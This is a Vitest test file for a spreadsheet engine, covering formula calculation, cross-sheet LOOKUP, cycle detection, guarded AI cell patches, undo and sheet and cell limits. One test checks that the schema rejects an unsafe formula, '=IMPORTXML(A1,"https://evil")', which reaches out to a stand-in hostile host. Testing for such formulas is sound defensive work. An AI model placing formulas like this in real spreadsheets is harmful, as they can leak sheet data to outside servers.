import { expect, it } from "vitest";
import { workbookSchema } from "../../src/lib/creation/contracts/sheet.js";
import { applySheetOperations, applySheetWithInverse, SheetOperationError } from "../../src/lib/creation/sheet-operations.js";
import { calculateWorkbook } from "../../src/lib/creation/sheet-calculation.js";

const book = () => workbookSchema.parse({ schemaVersion: 1, kind: "sheet", title: "Sales", sheets: [{ id: "sales", name: "Sales", cells: [
  { id: "a1", address: "A1", value: "Amount" }, { id: "a2", address: "A2", value: 10 }, { id: "a3", address: "A3", value: 20 },
  { id: "b1", address: "B1", value: "Total" }, { id: "b2", address: "B2", formula: "=SUM(A2:A3)" }, { id: "c2", address: "C2", formula: "=B2*2" },
] }] });

it("keeps sparse cells stable and calculates bounded formulas, ranges, IF, and cycles", () => {
  const result = calculateWorkbook(book()).sheets[0];
  expect(result.cells.find(cell => cell.address === "B2").display).toBe("30");
  expect(result.cells.find(cell => cell.address === "C2").display).toBe("60");
  const computed = applySheetOperations(book(), [{ op: "setCell", sheetId: "sales", address: "D2", id: "d2", formula: '=IF(C2>50,"ok","low")' }, { op: "setCell", sheetId: "sales", address: "E2", id: "e2", formula: "=D2" }]);
  expect(calculateWorkbook(computed).sheets[0].cells.find(cell => cell.address === "D2").display).toBe("ok");
  const cycle = applySheetOperations(book(), [{ op: "setCell", sheetId: "sales", address: "D2", id: "d2", formula: "=E2" }, { op: "setCell", sheetId: "sales", address: "E2", id: "e2", formula: "=D2" }]);
  expect(calculateWorkbook(cycle).sheets[0].cells.find(cell => cell.address === "D2").display).toBe("#REF!");
});

it("supports bounded cross-sheet references and LOOKUP without external access", () => {
  const workbook = workbookSchema.parse({ schemaVersion: 1, kind: "sheet", title: "Cross", sheets: [
    { id: "source", name: "Source", cells: [{ id: "a1", address: "A1", value: "Coffee" }, { id: "b1", address: "B1", value: 18 }] },
    { id: "summary", name: "Summary", cells: [{ id: "a1", address: "A1", formula: "=Source!B1*2" }, { id: "a2", address: "A2", formula: '=LOOKUP("Coffee",Source!A1:A1,Source!B1:B1)' }] },
  ] });
  const result = calculateWorkbook(workbook).sheets[1]; expect(result.cells.find(cell => cell.address === "A1").display).toBe("36"); expect(result.cells.find(cell => cell.address === "A2").display).toBe("18");
});

it("allows exact range AI patches while rejecting stale cells, unsafe formulas, and wrong identity", () => {
  const changed = applySheetOperations(book(), [{ op: "setCell", sheetId: "sales", address: "A2", id: "a2", value: 15, expectedValue: 10 }]);
  expect(changed.sheets[0].cells.find(cell => cell.address === "A2").value).toBe(15);
  expect(() => applySheetOperations(book(), [{ op: "setCell", sheetId: "sales", address: "A2", id: "a2", value: 15, expectedValue: 11 }])).toThrow("SHEET_CELL_CHANGED");
  expect(() => workbookSchema.parse({ ...book(), sheets: [{ ...book().sheets[0], cells: [{ id: "x", address: "A1", formula: "=IMPORTXML(A1,\"https://evil\")" }] }] })).toThrow();
  expect(() => applySheetOperations(book(), [{ op: "setCell", sheetId: "sales", address: "A2", id: "a1", value: 15 }])).toThrow("SHEET_DUPLICATE_CELL");
  expect(() => applySheetOperations(book(), [{ op: "setCellStyle", sheetId: "sales", address: "A9", style: { bold: true } }])).toThrow(SheetOperationError);
});

it("supports copy-on-write undo, view freeze, rename, and formula/value exclusivity", () => {
  const source = book(), { workbook, inverse } = applySheetWithInverse(source, [{ op: "setCell", sheetId: "sales", address: "A2", id: "a2", value: 15 }, { op: "setFreeze", sheetId: "sales", freezeRows: 1, freezeColumns: 2 }, { op: "renameSheet", sheetId: "sales", name: "2026 Sales" }]);
  expect(source.sheets[0].name).toBe("Sales"); expect(workbook.sheets[0].name).toBe("2026 Sales"); expect(workbook.sheets[0].freezeRows).toBe(1);
  const restored = applySheetOperations(workbook, inverse);
  expect(restored.sheets[0].name).toBe("Sales"); expect(restored.sheets[0].cells.find(cell => cell.address === "A2").value).toBe(10);
  expect(() => workbookSchema.parse({ ...book(), sheets: [{ ...book().sheets[0], cells: [{ id: "x", address: "A1", value: 1, formula: "=2" }] }] })).toThrow("SHEET_FORMULA_VALUE_EXCLUSIVE");
});

it("enforces five-sheet and one-hundred-thousand-cell boundaries before persistence", () => {
  const five = workbookSchema.parse({ schemaVersion: 1, kind: "sheet", title: "Book", sheets: Array.from({ length: 5 }, (_, i) => ({ id: `s${i}`, name: `Sheet ${i}`, cells: [] })) });
  expect(five.sheets).toHaveLength(5);
  expect(() => workbookSchema.parse({ ...five, sheets: [...five.sheets, { id: "s5", name: "Sheet 5", cells: [] }] })).toThrow();
  expect(() => workbookSchema.parse({ schemaVersion: 1, kind: "sheet", title: "Book", sheets: [{ id: "s", name: "S", cells: Array.from({ length: 100001 }, (_, i) => ({ id: `c${i}`, address: `A${i + 1}`, value: i })) }] })).toThrow();
});
